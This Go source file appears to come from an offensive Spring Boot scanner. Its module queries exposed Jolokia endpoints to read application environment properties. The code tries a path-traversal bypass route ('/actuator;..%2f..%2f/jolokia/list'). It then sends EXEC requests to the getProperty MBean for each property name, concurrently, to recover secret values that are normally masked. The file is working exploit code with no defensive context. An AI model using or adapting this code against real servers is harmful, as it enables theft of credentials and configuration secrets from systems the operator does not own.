package one

import (
	"encoding/json"
	"errors"
	"fmt"
	"github.com/projectdiscovery/gologger"
	"github.com/wjlin0/sbe-scan/pkg/method"
	"github.com/wjlin0/sbe-scan/pkg/types"
	"net/http"
	"strings"
	"sync"
)

type Agent struct {
	EnvJson *method.Configuration
}

const (
	Source = "one"
)

func (a *Agent) Name() string {
	return Source
}

func (a *Agent) Run(domain string, sessions *method.Session, options *types.Options, oldEnvJson *method.Configuration) error {
	var (
		jolokiaURL  string
		jolokiaList *method.JolokiaList
		urls        []string
	)
	if options.IsJolokiaListAuto() {
		urls = append(urls, "/jolokia/list", "/actuator/jolokia/list", "/actuator;..%2f..%2f/jolokia/list")
	} else {
		urls = append(urls, options.JolokiaListURL...)
	}
	if jolokiaListMap, err := sessions.GetJolokiaList(domain, urls...); err != nil {
		return err
	} else {
		for url, jolokia := range jolokiaListMap {
			jolokiaURL = strings.Replace(url, "/list", "", 1)
			jolokiaList = jolokia
		}
	}
	// 判断是否存在 getProperty 的 mbean
	if !jolokiaList.IsGetProperty() {
		return errors.New("method one can't get env value")
	}
	// 获取 env 的内容
	oldProperties := oldEnvJson.GetProperties()
	newProperties := make(map[string]string)
	for key, value := range oldProperties {
		newProperties[key] = value
	}
	var properties []string
	switch options.IsEnvNameAuto() {
	case false:
		properties = options.EnvName
	case true:
		for property, _ := range oldProperties {
			properties = append(properties, property)
		}
	}
	for _, property := range properties {
		values := a.getEnvValue(sessions, options, jolokiaURL, jolokiaList.GetGetProperty(), property)
		if values == "" {
			return errors.New("method one can't get env value because of the first property is empty")
		}
		break
	}
	var wg sync.WaitGroup
	var lock sync.Mutex
	for _, property := range properties {
		wg.Add(1)
		go func(property string) {
			defer wg.Done()
			values := a.getEnvValue(sessions, options, jolokiaURL, jolokiaList.GetGetProperty(), property)
			if values != "" {
				lock.Lock()
				newProperties[property] = values
				lock.Unlock()
				gologger.Info().Msgf("method one get env value %s=%s", property, values)
			}

		}(property)
	}
	wg.Wait()
	a.EnvJson = oldEnvJson.Clone()
	a.EnvJson.UpdatePropertiesValue(newProperties)
	return nil
}

// Describe 描述方法一是什么
func Describe() string {
	return "利用 jolokia 中利用的 mbean.getProperty 获取 springboot 的环境变量"
}
func (a *Agent) getEnvValue(sessions *method.Session, options *types.Options, url, mbean, env string) string {
	postBody := fmt.Sprintf("{\"mbean\": \"%s\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}", mbean, env)
	request, err := sessions.NewRequest(http.MethodPost, url, postBody)
	if err != nil {
		return ""
	}
	if request.Header.Get("Content-Type") == "" {
		request.Header.Set("Content-Type", "application/json")
	}
	resp, err := sessions.Do(request)
	if err != nil {
		return ""
	}
	if resp.StatusCode != http.StatusOK {
		return ""
	}
	body, err := method.ReadBody(resp)
	if err != nil {
		return ""
	}

	// 序列化 json
	responseJson := jsonRequest{}
	if json.Unmarshal(body.Bytes(), &responseJson) != nil {
		return ""
	}
	return responseJson.Value
}

// jsonRequest 定义与 JSON 对应的结构体
type jsonRequest struct {
	Value string `json:"value"`
}
